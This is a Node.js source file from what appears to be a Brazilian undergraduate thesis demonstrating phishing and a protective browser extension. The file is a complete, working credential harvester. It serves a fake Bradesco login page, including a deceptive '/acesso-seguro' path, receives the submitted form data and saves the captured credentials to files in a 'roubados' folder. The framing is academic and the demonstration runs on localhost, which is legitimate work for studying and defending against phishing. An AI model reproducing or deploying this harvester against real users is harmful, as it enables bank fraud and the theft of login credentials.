/*
  TCC: Coletor de credenciais + servidor da página falsa.
  SIMULAÇÃO ACADÊMICA. Faz duas coisas num processo só, para rodar em UM único
  terminal:
    1) serve a página falsa do Bradesco e o e-mail falso (requisições GET);
    2) recebe o POST do formulário e grava os dados em um arquivo de texto,
       imitando a exfiltração de um site de phishing.
  Isto demonstra o que acontece QUANDO A EXTENSÃO ESTÁ DESLIGADA. Com a
  extensão ativa, o envio HTTP é bloqueado e nada chega aqui.

  Como usar:
    node coletor.js
  Depois abra http://localhost:9000/ no navegador.
*/

const http = require("http");
const fs = require("fs");
const path = require("path");
const querystring = require("querystring");

// § Ajuste aqui a pasta onde os dados roubados serão gravados.
const PASTA_DESTINO = "D:\\User\\Documentos\\TCC\\roubados";
const PORTA = 9000;

// Garante que a pasta de destino exista.
fs.mkdirSync(PASTA_DESTINO, { recursive: true });

// § Tipos de conteúdo para servir os arquivos estáticos da página falsa.
const TIPOS = {
  ".html": "text/html; charset=utf-8",
  ".css": "text/css; charset=utf-8",
  ".js": "text/javascript; charset=utf-8",
};

// § Monta o conteúdo do arquivo de texto com os dados capturados.
function montarTexto(dados) {
  const quando = new Date().toLocaleString("pt-BR");
  const linhas = [
    "=== CREDENCIAIS CAPTURADAS (SIMULACAO ACADEMICA - TCC) ===",
    "Data/hora: " + quando,
    "",
  ];
  for (const chave of Object.keys(dados)) {
    linhas.push(chave + ": " + dados[chave]);
  }
  linhas.push("");
  linhas.push("Origem: pagina falsa do Bradesco servida em localhost.");
  return linhas.join("\r\n");
}

// § Serve um arquivo estático da pasta do projeto (GET).
function servirEstatico(req, res) {
  let caminhoRel = decodeURIComponent(req.url.split("?")[0]);
  if (caminhoRel === "/") {
    caminhoRel = "/index.html";
  }
  // § Caminho com cara de endereço oficial: serve a tela de login.
  if (caminhoRel === "/acesso-seguro" || caminhoRel === "/acesso-seguro/") {
    caminhoRel = "/index.html";
  }
  // Impede sair da pasta do projeto.
  const caminho = path.join(__dirname, path.normalize(caminhoRel));
  if (!caminho.startsWith(__dirname)) {
    res.writeHead(403);
    res.end("Acesso negado.");
    return;
  }
  fs.readFile(caminho, (erro, conteudo) => {
    if (erro) {
      res.writeHead(404, { "Content-Type": "text/plain; charset=utf-8" });
      res.end("Arquivo nao encontrado.");
      return;
    }
    const tipo = TIPOS[path.extname(caminho)] || "application/octet-stream";
    res.writeHead(200, { "Content-Type": tipo });
    res.end(conteudo);
  });
}

const servidor = http.createServer((req, res) => {
  // § Recebimento dos dados roubados (POST).
  if (req.method === "POST" && req.url === "/coletar") {
    let corpo = "";
    req.on("data", (parte) => {
      corpo += parte;
    });
    req.on("end", () => {
      // § Dados chegam como application/x-www-form-urlencoded.
      const dados = querystring.parse(corpo);
      const texto = montarTexto(dados);

      const nomeArquivo = "credenciais-" + Date.now() + ".txt";
      const caminho = path.join(PASTA_DESTINO, nomeArquivo);
      fs.writeFileSync(caminho, texto, "utf8");

      console.log("[coletor] Dados gravados em: " + caminho);

      // § Resposta de confirmação (prova, no vídeo, de que o roubo funcionou).
      res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
      res.end(
        "<!DOCTYPE html><html lang='pt-BR'><head><meta charset='utf-8'>" +
          "<title>Dados capturados</title></head><body style=\"font-family:Arial;" +
          "max-width:600px;margin:60px auto;color:#333\">" +
          "<h1 style='color:#cc092f'>Dados capturados (simulacao academica)</h1>" +
          "<p>O site falso recebeu suas credenciais e gravou o arquivo em:</p>" +
          "<pre style='background:#f3f3f3;padding:12px;border-radius:6px'>" +
          caminho +
          "</pre>" +
          "<p>Em um ataque real, voce teria sido redirecionado ao site" +
          " verdadeiro sem perceber. Com a extensao ligada, este envio seria" +
          " bloqueado.</p>" +
          "<p><a href='http://localhost:9000/'>Voltar a pagina de login</a></p>" +
          "</body></html>"
      );
    });
    return;
  }

  // § Qualquer outra requisição GET serve a página falsa.
  if (req.method === "GET") {
    servirEstatico(req, res);
    return;
  }

  res.writeHead(404, { "Content-Type": "text/plain; charset=utf-8" });
  res.end("Coletor ativo. Envie um POST para /coletar.");
});

servidor.listen(PORTA, () => {
  console.log("[coletor] Site falso + coletor em http://localhost:" + PORTA + "/");
  console.log("[coletor] Pasta de destino: " + PASTA_DESTINO);
});
